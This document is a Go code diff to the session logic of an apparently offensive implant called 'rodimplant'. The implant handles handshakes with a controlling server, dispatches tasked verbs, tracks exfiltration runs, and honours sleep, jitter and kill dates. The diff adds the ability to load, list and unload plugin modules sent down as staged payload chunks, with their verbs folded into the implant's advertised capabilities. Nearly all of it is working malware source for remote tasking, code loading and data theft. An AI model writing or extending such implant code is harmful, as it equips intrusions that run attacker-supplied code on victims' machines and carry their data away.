@@ -10,9 +10,11 @@ import (
 	"encoding/binary"
 	"fmt"
 	"math/rand"
+	"strings"
 	"time"
 
 	"rodimplant/internal/envelope"
+	"rodimplant/internal/plugins"
 	"rodimplant/internal/wire"
 
 	"google.golang.org/protobuf/proto"
@@ -63,6 +65,25 @@ type exfilRun struct {
 	idleCycles   int
 }
 
+// moduleVerbs is the module family's own verbs (architecture.md Sec 5.4):
+// dispatched by the session against the plugin registry, advertised when
+// the bake names them, and reserved -- a module cannot own them.
+var moduleVerbs = map[string]bool{
+	"module.load":   true,
+	"module.unload": true,
+	"module.list":   true,
+}
+
+// moduleTable is the plugin-registry surface the session drives: the
+// concrete registry by default, a stub in the tests.
+type moduleTable interface {
+	Load(handle string, payload []byte, expectedSHA256 string) (string, error)
+	Unload(name string) (string, error)
+	List() string
+	Dispatch(verb, arguments string) (wire.TaskOutcome, string, *plugins.Artifact, bool)
+	AdvertisedVerbs() []string
+}
+
 // Session is the implant's cross-carriage state.
 type Session struct {
 	ImplantID  string
@@ -80,12 +101,13 @@ type Session struct {
 	outbox    []*wire.Frame
 	delivered []*wire.Frame
 	exfil     []*exfilRun
+	staged    map[string]*stagedPending
+	plugins   moduleTable
 }
 
 // New builds a session over the enrolled identity and the compiled
 // handlers. The advertised verb list is the bake's set intersected with
-// the compiled handlers: the server only dispatches what this binary can
-// run.
+// what this binary can run: the compiled handlers plus the module family.
 func New(implantID string, bakedVerbs []string, sleepSeconds, jitterSeconds float64, killDate string, seal *envelope.Key, handlers map[string]Handler) *Session {
 	s := &Session{
 		ImplantID:     implantID,
@@ -95,9 +117,18 @@ func New(implantID string, bakedVerbs []string, sleepSeconds, jitterSeconds floa
 		Seal:          seal,
 		Verbs:         handlers,
 		answers:       map[string]*wire.Frame{},
+		staged:        map[string]*stagedPending{},
 	}
+	reserved := make([]string, 0, len(handlers)+len(moduleVerbs))
+	for verb := range handlers {
+		reserved = append(reserved, verb)
+	}
+	for verb := range moduleVerbs {
+		reserved = append(reserved, verb)
+	}
+	s.plugins = plugins.New(reserved)
 	for _, verb := range bakedVerbs {
-		if _, ok := handlers[verb]; ok {
+		if _, compiled := handlers[verb]; compiled || moduleVerbs[verb] {
 			s.Advertised = append(s.Advertised, verb)
 		}
 	}
@@ -105,7 +136,10 @@ func New(implantID string, bakedVerbs []string, sleepSeconds, jitterSeconds floa
 }
 
 // HandshakeFrame is the frame every contact opens with: identity,
-// protocol version, the advertised verbs, and the fresh cadence.
+// protocol version, the advertised set -- the baked verbs beside the loader
+// rows this build hosts (ADR-020) and every verb a loaded module
+// registered -- and the fresh cadence. The module rows are read at every
+// contact, so a load widens the advertisement at the next one.
 func (s *Session) HandshakeFrame() *wire.Frame {
 	request := &wire.HandshakeRequest{
 		Version:       &wire.ProtocolVersion{Major: 1, Minor: 0},
@@ -113,7 +147,14 @@ func (s *Session) HandshakeFrame() *wire.Frame {
 		SleepSeconds:  &s.SleepSeconds,
 		JitterSeconds: &s.JitterSeconds,
 	}
-	request.Capabilities = append(request.Capabilities, s.Advertised...)
+	seen := make(map[string]bool)
+	for _, row := range append(append(append([]string{}, s.Advertised...),
+		plugins.LoaderCapabilities()...), s.plugins.AdvertisedVerbs()...) {
+		if row != "" && !seen[row] {
+			seen[row] = true
+			request.Capabilities = append(request.Capabilities, row)
+		}
+	}
 	return FrameOf(request, wire.FrameKind_FRAME_KIND_UNSPECIFIED)
 }
 
@@ -167,10 +208,12 @@ func (s *Session) HandshakeAnswered(first *wire.Frame) error {
 
 // AcceptTasking reads the response body past its handshake frame. Frames
 // are discriminated on kind first, as the wire contract states: the seam
-// report advances an exfil run's confirmed bytes, and kindless frames
-// take the positional TaskRequest parse. A task whose result already
-// crossed is a redelivery -- the cached result answers again, nothing
-// re-executes.
+// report advances an exfil run's confirmed bytes, and the kindless
+// positional frames split by shape -- tasking carries a verb, a staged
+// chunk never does (its sequence field cannot land in the verb's wire
+// type), so a kindless frame parses as tasking only when its verb field is
+// set and as a chunk otherwise. A task whose result already crossed is a
+// redelivery -- the cached result answers again, nothing re-executes.
 func (s *Session) AcceptTasking(frames []*wire.Frame) {
 	for _, f := range frames {
 		switch f.Kind {
@@ -181,29 +224,81 @@ func (s *Session) AcceptTasking(frames []*wire.Frame) {
 			}
 		case wire.FrameKind_FRAME_KIND_UNSPECIFIED:
 			var task wire.TaskRequest
-			if err := proto.Unmarshal(f.Payload, &task); err == nil {
+			if err := proto.Unmarshal(f.Payload, &task); err == nil && task.Verb != "" {
 				s.Dispatch(&task)
+				continue
+			}
+			var chunk wire.StagedChunk
+			if err := proto.Unmarshal(f.Payload, &chunk); err == nil {
+				s.acceptStagedChunk(&chunk)
 			}
 		}
 	}
 }
 
-// Dispatch runs one dispatched task: the dedup half answers from the
-// cache, the verb half executes against the argument string and queues
-// the result (and, when the verb produced bulk, registers its exfil run).
+// Dispatch runs one dispatched task: the dedup half answers from the cache,
+// a staged task registers its transfer instead of executing, the module
+// family runs against the plugin registry, and everything else executes
+// against the compiled handler table -- falling through to the loaded
+// modules' routes when no compiled handler holds the verb. The result (and,
+// when the verb produced bulk, its exfil run) queues from exactly one
+// execution.
 func (s *Session) Dispatch(task *wire.TaskRequest) {
 	if cached, ok := s.answers[task.TaskId]; ok {
 		s.outbox = append(s.outbox, cached)
 		return
 	}
-	handler, ok := s.Verbs[task.Verb]
-	if !ok {
-		s.queueResult(task.TaskId, wire.TaskOutcome_TASK_OUTCOME_FAILED,
-			fmt.Sprintf("unknown verb %s", task.Verb), nil)
+	if task.StagedBytes != nil {
+		s.demandStaged(task)
 		return
 	}
-	outcome, output, artifact := handler(task.Arguments)
-	s.queueResult(task.TaskId, outcome, output, artifact)
+	switch task.Verb {
+	case "module.load":
+		s.queueResult(task.TaskId, wire.TaskOutcome_TASK_OUTCOME_FAILED,
+			"module.load stages its bytes as task content; issue it with the module as content", nil)
+		return
+	case "module.unload":
+		outcome, output := s.moduleUnload(task.Arguments)
+		s.queueResult(task.TaskId, outcome, output, nil)
+		return
+	case "module.list":
+		s.queueResult(task.TaskId, wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, s.plugins.List(), nil)
+		return
+	}
+	if handler, ok := s.Verbs[task.Verb]; ok {
+		outcome, output, artifact := handler(task.Arguments)
+		s.queueResult(task.TaskId, outcome, output, artifact)
+		return
+	}
+	if outcome, output, artifact, routed := s.plugins.Dispatch(task.Verb, task.Arguments); routed {
+		s.queueResult(task.TaskId, outcome, output, artifactOf(artifact))
+		return
+	}
+	s.queueResult(task.TaskId, wire.TaskOutcome_TASK_OUTCOME_FAILED,
+		fmt.Sprintf("unknown verb %s", task.Verb), nil)
+}
+
+// moduleUnload retracts one module by name, the report line or the grammar
+// refusal as its outcome.
+func (s *Session) moduleUnload(arguments string) (wire.TaskOutcome, string) {
+	name := strings.TrimSpace(arguments)
+	if name == "" {
+		return wire.TaskOutcome_TASK_OUTCOME_FAILED, "module.unload expects '<name>'"
+	}
+	report, err := s.plugins.Unload(name)
+	if err != nil {
+		return wire.TaskOutcome_TASK_OUTCOME_FAILED, err.Error()
+	}
+	return wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, report
+}
+
+// artifactOf widens a module run's artifact into the session's shape -- the
+// exfil arm's registration is identical for both sources.
+func artifactOf(artifact *plugins.Artifact) *Artifact {
+	if artifact == nil {
+		return nil
+	}
+	return &Artifact{Name: artifact.Name, ContentType: artifact.ContentType, Data: artifact.Data}
 }
 
 func (s *Session) queueResult(taskID string, outcome wire.TaskOutcome, output string, artifact *Artifact) {
@@ -223,6 +318,21 @@ func (s *Session) queueResult(taskID string, outcome wire.TaskOutcome, output st
 			sha:         sum,
 		})
 	}
+}
+
+// queueResultWithSha reports a staged task's result with the reassembled
+// payload's hex SHA-256 -- the both-side verification half (ADR-010): the
+// server compares it against the artifact it served, so a task only
+// records Succeeded when both sides hold the same bytes.
+func (s *Session) queueResultWithSha(taskID string, outcome wire.TaskOutcome, output string, artifact *Artifact, payloadSha string) {
+	result := &wire.Frame{
+		Payload: mustMarshal(&wire.TaskResult{
+			TaskId: taskID, Outcome: outcome, Output: output, PayloadSha256: &payloadSha,
+		}),
+		Kind: wire.FrameKind_FRAME_KIND_TASK_RESULT,
+	}
+	s.outbox = append(s.outbox, result)
+	s.answers[taskID] = result
 }
 
 // Batch is the queued result frames this contact carries.
